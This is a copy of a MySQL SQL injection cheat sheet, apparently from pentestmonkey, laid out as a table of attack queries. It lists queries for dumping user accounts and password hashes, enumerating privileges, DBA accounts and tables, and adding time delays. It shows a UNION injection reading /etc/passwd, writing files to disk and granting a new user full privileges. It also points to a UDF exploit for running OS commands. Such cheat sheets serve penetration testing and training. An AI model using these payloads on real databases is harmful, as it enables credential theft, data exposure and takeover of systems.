http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1; #comment<br>
SELECT /*comment*/1;</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user();<br>
SELECT system_user();</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT user FROM mysql.user; — priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT host, user, password FROM mysql.user; — priv</td>
</tr>
<tr>
<td>Password Cracker</td>
<td><a href="http://www.openwall.com/john/">John the Ripper</a> will crack MySQL password hashes.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT database()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT schema_name FROM information_schema.schemata; — for MySQL &gt;= v5.0<br>
SELECT distinct(db) FROM mysql.db — priv</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0<br>
SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(‘abcd’, 3, 1); # returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2; # returns 2<br>
SELECT 6 &amp; 1; # returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(65); # returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(‘A’); # returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT cast(’1′ AS unsigned integer);<br>
SELECT cast(’123′ AS char);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT CONCAT(‘A’,'B’); #returns AB<br>
SELECT CONCAT(‘A’,'B’,'C’); # returns ABC</td>
</tr>
<tr>
<td>If Statement</td>
<td>SELECT if(1=1,’foo’,'bar’); — returns ‘foo’</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT 0×414243; # returns ABC</td>
</tr>
<tr>
<td>Time Delay</td>
<td><span>SELECT BENCHMARK(1000000,MD5(‘A’));<br>
SELECT SLEEP(5); # &gt;= 5.0.12<br>
</span></td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>Impossible?</td>
</tr>
<tr>
<td>Command Execution</td>
<td>If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).&nbsp; The .so file should contain a User Defined Function (UDF).&nbsp; <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">raptor_udf.c</a> explains exactly how you go about this.&nbsp; Remember to compile for the target architecture which may or may not be the same as your attack platform.</td>
</tr>
<tr>
<td>Local File Access</td>
<td>…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.<br>
SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT @@hostname;</td>
</tr>
<tr>
<td>Create Users</td>
<td>CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv</td>
</tr>
<tr>
<td>Delete Users</td>
<td>DROP USER test1; — priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT @@datadir;</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>information_schema (&gt;= mysql 5.0)<br>
mysql</td>
</tr>
</tbody>
</table>